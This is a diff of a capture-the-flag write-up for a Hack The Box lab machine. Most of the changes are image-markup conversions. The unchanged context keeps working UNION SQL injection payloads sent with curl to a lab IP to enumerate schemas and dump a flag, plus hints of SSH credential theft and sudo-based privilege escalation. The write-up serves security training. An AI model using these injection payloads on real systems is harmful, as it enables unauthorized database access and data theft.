@@ -20,11 +20,11 @@ The name implies I should be looking for some type of UNION SQL Injection somewh
 
 This reveals a simple website that takes one user input:
 
-<figure><img src="../../../.gitbook/assets/image (4005).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4005).png>)
 
 If we enter anything, it says that we are eligible to compete in the tournament and gives us a link to `challenge.php`.
 
-<figure><img src="../../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1157).png>)
 
 Since this was a UHC box, `sqlmap` revealed nothing to me, so we have to do this manually. I tried some basic SQL Injection with UNION, and found that it was indeed vulnerable to SQL Injection:
 
@@ -35,7 +35,6 @@ Sorry, uhc@localhost you are not eligible due to already qualifying.
 
 So now we need to enumerate the database and grab the flag.:
 
-{% code overflow="wrap" %}
 ```
 $ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(schema_name) from information_schema.schemata; -- -"
 mysql,information_schema,performance_schema,sys,november
@@ -49,11 +48,10 @@ one,player
 $ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(one) from flag; -- -"
 UHC{F1rst_5tep_2_Qualify}
 ```
-{% endcode %}
 
 Once we submit the flag, we have SSH access, but we still have no password.
 
-<figure><img src="../../../.gitbook/assets/image (2334).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2334).png>)
 
 ### SSH Creds
 
@@ -116,7 +114,7 @@ Sorry, <?php
 
 With that, we can SSH into the machine.
 
-<figure><img src="../../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(855).png>)
 
 ## Privilege Escalation
 
@@ -164,7 +162,7 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3262).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3262).png>)
 
 When checking our `sudo` privileges, this is what we see:
 
@@ -178,4 +176,4 @@ User www-data may run the following commands on union:
     (ALL : ALL) NOPASSWD: ALL
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2741).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2741).png>)
